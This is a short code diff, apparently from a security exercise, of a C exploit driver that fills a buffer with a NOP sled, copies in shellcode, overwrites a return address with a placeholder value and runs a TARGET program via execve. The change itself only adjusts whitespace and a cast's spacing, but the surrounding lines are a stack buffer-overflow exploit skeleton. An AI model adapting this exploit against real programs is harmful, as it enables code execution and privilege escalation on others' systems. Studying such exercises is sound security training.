@@ -20,11 +20,11 @@ int main() {
     args[1] = malloc(137);
 
     memset(args[1], 0x90, 136);
-
     args[1][136] = '\0';
+
     memcpy(args[1], shellcode, strlen(shellcode));
 
-    *(unsigned int *)(args[1] + 132) = 0x12345678;
+    *(unsigned int*)(args[1] + 132) = 0x12345678;
 
     if (0 > execve(TARGET, args, env)) {
         fprintf(stderr, "execve failed.\n");
